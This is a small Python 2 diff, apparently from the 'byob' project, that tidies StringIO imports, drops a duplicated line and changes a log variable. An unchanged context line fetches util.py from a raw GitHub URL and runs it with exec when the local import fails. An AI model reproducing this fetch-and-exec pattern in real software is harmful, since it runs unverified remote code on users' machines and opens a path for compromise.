@@ -11,10 +11,7 @@ import struct
 import socket
 import urllib
 import binascii
-try:
-    from cStringIO import StringIO
-except:
-    from StringIO import StringIO
+import StringIO
 
 # utilities
 try:
@@ -23,12 +20,11 @@ except ImportError:
     util = imp.new_module('util')
     exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py')
     sys.modules['util'] = util
-    sys.modules['util'] = util
 
 # globals
 packages  = []
 platforms = ['linux2','darwin']
-log       = []
+log       = StringIO.StringIO()
 util.is_compatible(platforms, __name__)
 util.imports(packages)
 
